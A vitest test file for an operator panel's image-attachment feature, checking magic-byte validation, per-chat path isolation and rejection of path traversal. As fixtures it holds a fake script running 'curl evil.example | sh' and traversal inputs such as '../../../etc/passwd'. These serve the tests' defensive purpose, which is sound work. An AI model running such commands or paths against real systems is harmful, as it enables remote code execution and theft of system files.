/**
 * An operator's image, on its way into the agent's session.
 *
 * The picture lands in `in/media/<chatKey>/`, beside the attachments that
 * arrived from WhatsApp — the one directory the agent already reads pictures
 * from, mounted read-only on its side. That placement is the whole design: the
 * agent gains a file it can read, in a directory it could already read, and
 * still cannot write there or reach anything else.
 *
 * Two properties carry the weight, and both are about not trusting what the
 * request said. The file's own leading bytes decide whether it is an image,
 * because a `.png` full of shell script is a `.png` to any check that reads the
 * header. And a path handed back to `sendToChat` is re-derived against the chat
 * it claims to belong to, because otherwise an operator's own session would be
 * a way to name a file in somebody else's conversation.
 */
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, unlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeEach, describe, expect, it } from 'vitest';

const KEY = 'abcdef0123456789';
const OTHER = 'fedcba9876543210';
const T0 = 1234567890000;

const box = mkdtempSync(join(tmpdir(), 'tulip-attach-'));
mkdirSync(join(box, 'in'), { recursive: true });
mkdirSync(join(box, 'out'), { recursive: true });
process.env['TULIP_IN_DIR'] = join(box, 'in');
process.env['TULIP_OUT_DIR'] = join(box, 'out');
process.env['TULIP_STATE_DIR'] = join(box, 'state');

const api = await import('../src/panel-api.js');

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(64)]);
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(64)]);
const WEBP = Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WEBP'), Buffer.alloc(64)]);
const SCRIPT = Buffer.from('#!/bin/sh\ncurl evil.example | sh\n');

beforeEach(() => {
  try { unlinkSync(join(box, 'in', 'terminal.json')); } catch { /* the state being asked for */ }
  rmSync(join(box, 'in', 'media'), { recursive: true, force: true });
});

afterAll(() => rmSync(box, { recursive: true, force: true }));

function agentReports(chatKeys: readonly string[]): void {
  writeFileSync(join(box, 'out', 'status.json'), JSON.stringify({
    at: new Date(T0).toISOString(), busyTurn: null, fatal: null,
    sessions: chatKeys.map((chatKey) => ({
      chatKey, startedAt: new Date(T0).toISOString(), lastUsedAt: new Date(T0).toISOString(), turns: 1,
    })),
  }));
}

function deps(known: readonly string[] = [KEY, OTHER]): Parameters<typeof api.attachToChat>[0] {
  return {
    chats: { get: (key: string) => (known.includes(key) ? { chatKey: key, name: 'Ana' } : null) },
    config: { limits: { maxMediaBytes: 16_777_216 } },
  } as unknown as Parameters<typeof api.attachToChat>[0];
}

/**
 * The most recent line typed.
 *
 * `terminalKeys` keeps a *sliding window* of keys in module state, so the
 * request file accumulates every send this process has made and `keys[0]` is
 * the first line ever typed rather than the latest. The newest line is the last
 * literal entry — everything after it is the Enter that submitted it.
 */
function typed(): string | null {
  try {
    const req = JSON.parse(readFileSync(join(box, 'in', 'terminal.json'), 'utf8')) as
      { keys: Array<{ text: string; literal: boolean }> };
    const literal = req.keys.filter((k) => k.literal);
    return literal.length ? (literal[literal.length - 1]?.text ?? null) : null;
  } catch { return null; }
}

describe('what counts as an image', () => {
  it('accepts a PNG, a JPEG and a WebP, and names them by what they are', () => {
    for (const [bytes, ext] of [[PNG, 'png'], [JPEG, 'jpg'], [WEBP, 'webp']] as const) {
      const out = api.attachToChat(deps(), KEY, 'image/' + ext, bytes);
      expect(out.ok, ext).toBe(true);
      expect(out.path).toMatch(new RegExp(`^media/${KEY}/op-\\d+-[0-9a-f]{8}\\.${ext}$`));
      expect(existsSync(join(box, 'in', out.path!))).toBe(true);
    }
  });

  it('refuses a script, however it is announced', () => {
    const out = api.attachToChat(deps(), KEY, 'image/png', SCRIPT);
    expect(out.ok).toBe(false);
    expect(out.message).toContain('The file itself is checked');
    expect(existsSync(join(box, 'in', 'media', KEY))).toBe(false);
  });

  it('refuses RIFF that is not WebP — the first four bytes are not enough', () => {
    const wav = Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WAVE'), Buffer.alloc(64)]);
    expect(api.attachToChat(deps(), KEY, 'image/webp', wav).ok).toBe(false);
  });

  it('refuses an empty file and an unknown chat', () => {
    expect(api.attachToChat(deps(), KEY, 'image/png', Buffer.alloc(0)).ok).toBe(false);
    expect(api.attachToChat(deps(), '0000000000000000', 'image/png', PNG).ok).toBe(false);
  });

  it('files it under the chat it belongs to, beside WhatsApp attachments', () => {
    api.attachToChat(deps(), KEY, 'image/png', PNG);
    expect(readdirSync(join(box, 'in', 'media'))).toEqual([KEY]);
  });
});

describe('naming an attachment when the line is typed', () => {
  it('tells the agent where to find it, absolutely', () => {
    agentReports([KEY]);
    const stored = api.attachToChat(deps(), KEY, 'image/png', PNG);
    const out = api.sendToChat(deps(), KEY, 'Have a look at this', [stored.path!]);

    expect(out.ok).toBe(true);
    const line = typed() ?? '';
    expect(line).toContain('Have a look at this');
    // Absolute, because the prompt's working directory is the chat's workspace
    // rather than the handoff volume — a relative path resolves to nothing.
    expect(line).toContain(join(box, 'in', stored.path!));
    expect(line).toContain('the operator attached an image');
  });

  it('sends an image with no words at all', () => {
    agentReports([KEY]);
    const stored = api.attachToChat(deps(), KEY, 'image/png', PNG);
    expect(api.sendToChat(deps(), KEY, '', [stored.path!]).ok).toBe(true);
    expect(typed()).toContain(stored.path!.split('/').pop());
  });

  it('still refuses a line with neither words nor an image', () => {
    agentReports([KEY]);
    expect(api.sendToChat(deps(), KEY, '   ', []).ok).toBe(false);
    expect(typed()).toBeNull();
  });

  /**
   * The one that matters. An operator's session is authenticated, so a path in
   * a request body is not attacker-supplied in the usual sense — but it is
   * still a value that arrived over the wire, and a path naming another chat's
   * directory would read one conversation's attachment into another's session.
   */
  it('will not name a file belonging to a different conversation', () => {
    agentReports([KEY, OTHER]);
    const theirs = api.attachToChat(deps(), OTHER, 'image/png', PNG);
    const out = api.sendToChat(deps(), KEY, 'look', [theirs.path!]);

    expect(out.ok).toBe(true);
    const line = typed() ?? '';
    expect(line).toBe('look');
    expect(line).not.toContain(OTHER);
  });

  it('ignores a path that escapes, is invented, or was never written', () => {
    agentReports([KEY]);
    for (const bad of [
      `media/${KEY}/../../../etc/passwd`,
      `media/${KEY}/op-1-deadbeef.png`,
      'media/../secrets.png',
      '/etc/passwd',
    ]) {
      api.sendToChat(deps(), KEY, 'hello', [bad]);
      const line = typed() ?? '';
      expect(line, bad).toBe('hello');
    }
  });

  it('carries at most four, so one message cannot name a directory', () => {
    agentReports([KEY]);
    const many = Array.from({ length: 6 }, () => api.attachToChat(deps(), KEY, 'image/png', PNG).path!);
    api.sendToChat(deps(), KEY, 'lots', many);
    const line = typed() ?? '';
    expect(line.match(/op-\d+-[0-9a-f]{8}\.png/g) ?? []).toHaveLength(4);
  });
});
